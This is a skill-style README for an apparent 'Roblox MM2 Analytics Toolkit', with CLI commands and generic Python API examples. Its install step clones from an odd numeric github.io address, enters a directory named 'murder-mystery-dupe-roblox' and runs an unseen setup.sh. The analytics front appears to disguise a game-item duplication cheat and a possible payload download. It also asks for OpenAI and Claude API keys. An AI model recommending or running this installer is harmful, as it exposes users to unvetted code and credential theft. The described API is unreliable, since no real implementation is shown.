---
name: roblox-mm2-analytics-toolkit
description: Analytics and inventory management toolkit for Roblox Murder Mystery 2 gameplay optimization and data tracking
triggers:
  - analyze my Murder Mystery 2 inventory
  - track MM2 knife skins and stats
  - set up Roblox MM2 analytics dashboard
  - optimize my Murder Mystery 2 strategy
  - export MM2 gameplay statistics
  - configure Roblox inventory tracker
  - visualize my MM2 collection data
  - generate Murder Mystery 2 performance reports
---

# Roblox MM2 Analytics Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

This toolkit provides comprehensive analytics, inventory tracking, and strategic insights for Roblox's Murder Mystery 2 game. It enables data collection, visualization, and optimization of gameplay through local analysis tools.

## What This Project Does

The MM2 Analytics Toolkit offers:
- **Inventory tracking** for knife skins, gamepasses, and collectibles
- **Analytics dashboard** with performance metrics and win/loss tracking
- **Strategy analysis** using pattern recognition and AI-powered insights
- **Data visualization** for collection management and gameplay statistics
- **Export capabilities** for CSV, JSON, and other formats

## Installation

### Automated Setup

```bash
# Clone the repository
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox

# Run automated installer
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
# Install Node.js dependencies
npm install

# Install Python dependencies
python3 -m pip install -r requirements.txt

# Verify installation
python3 main.py --version
```

### Environment Configuration

Create a `.env` file in the project root:

```bash
# API Configuration (optional for AI features)
API_OPENAI_KEY=$OPENAI_API_KEY
API_CLAUDE_KEY=$CLAUDE_API_KEY

# Data Storage
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300

# Features
ENABLE_LIVE_TRACKING=true
EXPORT_FORMAT=json
LOG_LEVEL=INFO
```

## Core Commands

### Basic Analytics Run

```bash
# Start analytics engine with default profile
python3 main.py --mode analytics

# Use specific profile
python3 main.py --mode analytics --profile my_profile

# Export results
python3 main.py --mode analytics \
  --profile my_profile \
  --export statistics.json \
  --format json
```

### Inventory Management

```bash
# Scan and catalog inventory
python3 main.py --mode inventory --scan

# Filter by rarity
python3 main.py --mode inventory \
  --filter rarity=legendary,ancient

# Generate collection report
python3 main.py --mode inventory \
  --report completionist \
  --output inventory_report.csv
```

### Strategy Analysis

```bash
# Analyze gameplay patterns
python3 main.py --mode strategy \
  --analyze patterns \
  --sessions last_30_days

# Generate recommendations
python3 main.py --mode strategy \
  --recommend \
  --role sheriff \
  --output recommendations.json
```

### Verbose Debugging

```bash
# Run with detailed logging
python3 main.py --mode analytics \
  --verbose \
  --log-level DEBUG \
  --log-file debug.log
```

## Python API Usage

### Basic Analytics Session

```python
from mm2_analytics import AnalyticsEngine, Profile

# Initialize analytics engine
engine = AnalyticsEngine(
    data_dir="./data/collections",
    refresh_rate=30
)

# Load or create profile
profile = Profile.load("mystery_solver_01")
if not profile:
    profile = Profile.create(
        username="MysterySolver2026",
        preferred_role="sheriff"
    )

# Run analytics
results = engine.analyze(profile)

# Access metrics
print(f"Win Rate: {results.win_rate}%")
print(f"Total Games: {results.total_games}")
print(f"Inventory Value: {results.inventory_value}")
```

### Inventory Tracking

```python
from mm2_analytics import InventoryManager, ItemFilter

# Initialize inventory manager
inventory = InventoryManager(profile="mystery_solver_01")

# Scan for items
items = inventory.scan(categories=["knife_skins", "gamepasses"])

# Filter by rarity
legendary_items = inventory.filter(
    ItemFilter(
        category="knife_skins",
        rarity=["legendary", "ancient"]
    )
)

# Generate report
report = inventory.generate_report(
    format="json",
    include_valuations=True
)

# Export to file
inventory.export(report, "inventory_2026.json")
```

### Strategy Analysis

```python
from mm2_analytics import StrategyAnalyzer, Pattern

# Initialize analyzer
analyzer = StrategyAnalyzer(
    profile="mystery_solver_01",
    ai_enabled=True  # Requires API keys
)

# Analyze recent sessions
patterns = analyzer.analyze_sessions(
    time_range="last_30_days",
    role_filter="sheriff"
)

# Get recommendations
recommendations = analyzer.get_recommendations(
    role="sheriff",
    priority="high_visibility_areas"
)

for rec in recommendations:
    print(f"{rec.title}: {rec.description}")
    print(f"Success Rate: {rec.success_rate}%")
```

### Data Visualization

```python
from mm2_analytics import Visualizer
import matplotlib.pyplot as plt

# Initialize visualizer
viz = Visualizer(profile="mystery_solver_01")

# Create win/loss chart
fig = viz.create_win_loss_chart(
    time_range="last_90_days",
    group_by="role"
)
fig.savefig("win_loss_chart.png")

# Inventory value over time
fig = viz.create_inventory_timeline(
    show_predictions=True
)
fig.savefig("inventory_timeline.png")

# Strategy heatmap
fig = viz.create_strategy_heatmap(
    metric="success_rate",
    role="sheriff"
)
fig.savefig("strategy_heatmap.png")
```

## Configuration Files

### Profile Configuration (YAML)

Create `profiles/my_profile.yaml`:

```yaml
profile:
  username: "MysterySolver2026"
  preferred_role: "sheriff"
  
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient", "unique"]
    - category: "gamepasses"
      active: true
  
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: "csv, json"
    
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
      patrol_pattern: "random"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
      group_behavior: "stay_with_crowd"
```

### Analytics Configuration (JSON)

Create `config/analytics.json`:

```json
{
  "analytics": {
    "tracking_enabled": true,
    "metrics": {
      "win_rate": true,
      "role_performance": true,
      "inventory_valuation": true,
      "strategy_effectiveness": true
    },
    "export": {
      "auto_export": true,
      "formats": ["json", "csv"],
      "schedule": "daily"
    }
  },
  "visualization": {
    "chart_style": "modern",
    "color_scheme": "roblox",
    "responsive": true
  }
}
```

## Common Patterns

### Automated Daily Reports

```python
from mm2_analytics import AnalyticsEngine, Scheduler
import os

def generate_daily_report():
    """Generate and email daily analytics report"""
    engine = AnalyticsEngine()
    profile = Profile.load(os.getenv("MM2_PROFILE", "default"))
    
    # Run analytics
    results = engine.analyze(profile, time_range="last_24_hours")
    
    # Export report
    report_path = f"reports/daily_{results.date}.json"
    results.export(report_path)
    
    # Generate visualizations
    viz = Visualizer(profile=profile.name)
    viz.create_daily_summary().savefig(f"reports/summary_{results.date}.png")
    
    return report_path

# Schedule daily at midnight
scheduler = Scheduler()
scheduler.add_job(generate_daily_report, trigger="cron", hour=0)
scheduler.start()
```

### Real-Time Inventory Monitoring

```python
from mm2_analytics import InventoryMonitor
import time

monitor = InventoryMonitor(
    profile="mystery_solver_01",
    watch_interval=60  # seconds
)

@monitor.on_change
def handle_inventory_change(change):
    """React to inventory changes"""
    if change.type == "new_item":
        print(f"New item acquired: {change.item.name}")
        print(f"Estimated value: {change.item.value}")
    elif change.type == "value_increase":
        print(f"Item value increased: {change.item.name}")
        print(f"Old: {change.old_value}, New: {change.new_value}")

# Start monitoring
monitor.start()
```

### AI-Powered Strategy Suggestions

```python
from mm2_analytics import AIStrategyAdvisor
import os

advisor = AIStrategyAdvisor(
    api_key=os.getenv("API_OPENAI_KEY"),
    model="gpt-4"
)

# Get personalized advice
profile = Profile.load("mystery_solver_01")
recent_games = profile.get_recent_games(limit=10)

advice = advisor.analyze_and_suggest(
    profile=profile,
    recent_games=recent_games,
    focus_areas=["sheriff_tactics", "map_awareness"]
)

print("Strategic Recommendations:")
for suggestion in advice.suggestions:
    print(f"\n{suggestion.title}")
    print(f"Priority: {suggestion.priority}")
    print(f"Description: {suggestion.description}")
    print(f"Expected Improvement: +{suggestion.expected_improvement}%")
```

### Batch Processing Multiple Profiles

```python
from mm2_analytics import BatchProcessor
import glob

processor = BatchProcessor()

# Load all profiles
profile_files = glob.glob("profiles/*.yaml")
profiles = [Profile.load_from_file(f) for f in profile_files]

# Process all profiles
results = processor.process_all(
    profiles=profiles,
    operations=[
        "scan_inventory",
        "analyze_performance",
        "export_statistics"
    ]
)

# Generate summary
summary = processor.create_summary(results)
summary.export("batch_summary.json")
```

## Troubleshooting

### Import Errors

```python
# If main module not found
import sys
sys.path.append('/path/to/murder-mystery-dupe-roblox')
from mm2_analytics import AnalyticsEngine

# Or use relative imports
from .mm2_analytics import AnalyticsEngine
```

### Data Directory Issues

```bash
# Ensure data directory exists
mkdir -p ./data/collections

# Set proper permissions
chmod 755 ./data/collections

# Verify in Python
python3 -c "from mm2_analytics import AnalyticsEngine; print(AnalyticsEngine.verify_paths())"
```

### API Rate Limiting

```python
from mm2_analytics import AIStrategyAdvisor
import time

advisor = AIStrategyAdvisor(
    api_key=os.getenv("API_OPENAI_KEY"),
    rate_limit=10,  # requests per minute
    retry_on_limit=True
)

# Use with rate limiting
try:
    advice = advisor.analyze_and_suggest(profile)
except RateLimitError as e:
    print(f"Rate limited. Retry after: {e.retry_after}s")
    time.sleep(e.retry_after)
```

### Memory Issues with Large Datasets

```python
from mm2_analytics import AnalyticsEngine

# Use streaming mode for large datasets
engine = AnalyticsEngine(
    streaming_mode=True,
    chunk_size=1000
)

# Process in batches
for batch in engine.analyze_in_batches(profile, batch_size=500):
    batch.export(f"batch_{batch.id}.json")
```

### Debug Logging

```python
import logging

# Enable debug logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='mm2_debug.log'
)

# Use in code
logger = logging.getLogger('mm2_analytics')
logger.debug("Starting inventory scan...")
```

## Best Practices

1. **Always use environment variables** for API keys and sensitive data
2. **Validate profiles** before running analytics to avoid errors
3. **Export regularly** to prevent data loss
4. **Use streaming mode** for large datasets (>10k items)
5. **Enable rate limiting** when using AI features
6. **Back up profile configurations** before major updates
7. **Monitor disk space** when enabling auto-export features
